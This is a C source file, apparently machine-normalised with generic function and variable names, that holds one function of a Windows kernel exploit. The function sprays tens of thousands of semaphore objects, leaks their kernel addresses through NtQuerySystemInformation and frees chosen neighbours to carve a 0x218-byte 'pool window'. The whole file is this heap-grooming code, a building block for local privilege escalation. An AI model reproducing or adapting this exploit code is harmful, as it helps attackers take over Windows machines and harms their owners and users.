
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_6__ TYPE_2__ ;
typedef struct TYPE_5__ TYPE_1__ ;


typedef scalar_t__ (* lpNtQuerySystemInformation ) (int ,int ,int,int *) ;
typedef int hHandlesToClose ;
typedef size_t ULONG ;
typedef unsigned int UINT ;
struct TYPE_6__ {size_t NumberOfHandles; TYPE_1__* Handles; } ;
struct TYPE_5__ {int HandleValue; int Object; int * UniqueProcessId; } ;
typedef int PVOID ;
typedef TYPE_2__* PSYSTEM_HANDLE_INFORMATION_EX ;
typedef scalar_t__ NTSTATUS ;
typedef int * HANDLE ;
typedef int DWORD_PTR ;
typedef int DWORD ;


 int FUNC_0 (int *) ;
 int FUNC_1 (TYPE_2__*,int *) ;
 int * FUNC_2 (int *,int ,int,int *) ;
 int FUNC_3 () ;
 int FUNC_4 (char*) ;
 int FUNC_5 (int ,char*) ;
 int FUNC_6 () ;
 int FUNC_7 (int ) ;
 int * FUNC_8 (TYPE_2__*,int ) ;
 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 scalar_t__ VAR_3 ;
 int FUNC_9 (int) ;
 int VAR_4 ;
 int FUNC_10 (int *,int,int ,int ) ;
 int FUNC_11 (int ,int ,int ) ;
 int FUNC_12 (int **,int ,int) ;
 int FUNC_13 (char*,...) ;

void FUNC_14()
{

    lpNtQuerySystemInformation VAR_5 = (lpNtQuerySystemInformation)FUNC_5(FUNC_4(L"ntdll.dll"), "NtQuerySystemInformation");
    if (VAR_5 == ((void*)0))
    {
        FUNC_13("Such a fail...\n");
        return;
    }







    DWORD_PTR VAR_6 = 0;

    if (FUNC_7(FUNC_6()) == 5)
    {
        VAR_6 = 0x38;
    }
    else if (FUNC_7(FUNC_6()) == 6)
    {
        VAR_6 = 0x48;
    }

    unsigned int VAR_7 = 0;
    while (VAR_7 < 50000)
    {
        HANDLE VAR_8 = FUNC_2(((void*)0), 0, 3, ((void*)0));
        if (VAR_8 == ((void*)0))
        {
            break;
        }

        ++VAR_7;
    }

    FUNC_13("\t[+] Spawned lots of semaphores\n");

    FUNC_13("\t[.] Initing pool windows\n");
    FUNC_9(2000);

    DWORD VAR_9 = 4096;
    NTSTATUS VAR_10 = 0xFFFFFFFF;
    PVOID VAR_11 = FUNC_10(((void*)0), 4096, VAR_0, VAR_2);

    while (1)
    {
        VAR_10 = VAR_5(VAR_4, VAR_11, VAR_9, ((void*)0));
        if (VAR_10 != VAR_3)
        {
            VAR_9 *= 2;
            FUNC_11(VAR_11, 0, VAR_1);
            VAR_11 = FUNC_10(((void*)0), VAR_9, VAR_0, VAR_2);
        }
        else
        {
            break;
        }
    };

    HANDLE VAR_12[0x30] = {0};
    DWORD VAR_13 = FUNC_3();
    PSYSTEM_HANDLE_INFORMATION_EX VAR_14 = (PSYSTEM_HANDLE_INFORMATION_EX)VAR_11;

    for (ULONG VAR_15 = 0; VAR_15 < VAR_14->NumberOfHandles; VAR_15++)
    {
        if (VAR_14->Handles[VAR_15].UniqueProcessId == (HANDLE)VAR_13)
        {
            DWORD_PTR VAR_16 = (DWORD_PTR)VAR_14->Handles[VAR_15].Object;
            DWORD_PTR VAR_17 = (DWORD_PTR)VAR_14->Handles[VAR_15].HandleValue;
            DWORD_PTR VAR_18 = 0;
            bool VAR_19 = 0;

            UINT VAR_20 = 0;


            VAR_20 = (0x218 / VAR_6) + ((0x218 % VAR_6 != 0) ? 1 : 0);

            if (

                    ((VAR_16 & 0xFFF) != 0)
                    &&

                    (((VAR_16 + 0x300) & 0xF000) == (VAR_16 & 0xF000))
                )
            {

                DWORD_PTR VAR_21 = VAR_16 - VAR_6;
                if (FUNC_8(VAR_14, (PVOID)VAR_21) == ((void*)0))
                {
                    continue;
                }

                for (unsigned int VAR_22 = 1; VAR_22 < VAR_20; VAR_22++)
                {
                    DWORD_PTR VAR_23 = VAR_16 + (VAR_22 * VAR_6);
                    HANDLE VAR_24 = FUNC_8(VAR_14, (PVOID)VAR_23);





                    if (VAR_24 != ((void*)0))
                    {
                        VAR_12[VAR_22] = VAR_24;

                        if (VAR_22 == VAR_20 - 1)
                        {

                            VAR_23 = VAR_16 + ((VAR_22 + 1) * VAR_6);
                            if (FUNC_8(VAR_14, (PVOID)VAR_23) != ((void*)0))
                            {
                                VAR_12[0] = (HANDLE)VAR_17;
                                VAR_19 = 1;

                                VAR_18 = VAR_16;


                                for (int VAR_25 = 0; VAR_25 < VAR_20; VAR_25++)
                                {
                                    if (VAR_12[VAR_25] != ((void*)0))
                                    {
                                        FUNC_0(VAR_12[VAR_25]);
                                        FUNC_1(VAR_14, VAR_12[VAR_25]);
                                    }
                                }
                            }
                            else
                            {
                                FUNC_12(VAR_12, 0, sizeof(VAR_12));
                                break;
                            }
                        }
                    }
                    else
                    {
                        FUNC_12(VAR_12, 0, sizeof(VAR_12));
                        break;
                    }
                }

                if (VAR_19)
                {
                    FUNC_13("\t[+] Window found at %08X!\n", VAR_18);
                }

            }
        }
    }

    FUNC_11(VAR_11, 0, VAR_1);

    return;
}
